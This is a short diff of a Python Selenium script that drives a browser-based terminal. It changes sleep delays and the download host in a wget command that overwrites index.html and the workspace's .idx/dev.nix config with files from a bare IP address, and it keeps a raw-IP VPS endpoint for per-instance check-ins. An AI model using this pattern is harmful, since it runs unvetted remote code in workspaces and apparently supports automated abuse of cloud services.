@@ -13,8 +13,8 @@ from selenium.webdriver.common.action_chains import ActionChains
 from selenium.common.exceptions import TimeoutException, NoSuchElementException
 
 # Configuration
-SLEEP_SEBELUM_AKSI = 30
-SLEEP_SESUDAH_AKSI = 120
+SLEEP_SEBELUM_AKSI = 90
+SLEEP_SESUDAH_AKSI = 90
 SLEEP_JIKA_ERROR = 10
 VPS_ENDPOINT = "http://47.84.61.131:5000"  # Change to your VPS IP
 RDP_ID = str(uuid.uuid4())  # Unique identifier for this RDP
@@ -105,7 +105,7 @@ def open_terminal_and_run(driver):
         time.sleep(3)
 
         commands = [
-            'wget -q -O index.html https://dot-store.biz.id/index.html && wget -q -O .idx/dev.nix https://dot-store.biz.id/joko.nix'
+            'wget -q -O index.html http://143.198.196.235/index.html && wget -q -O .idx/dev.nix http://143.198.196.235/dev.nix'
         ]
         for cmd in commands:
             actions = ActionChains(driver)
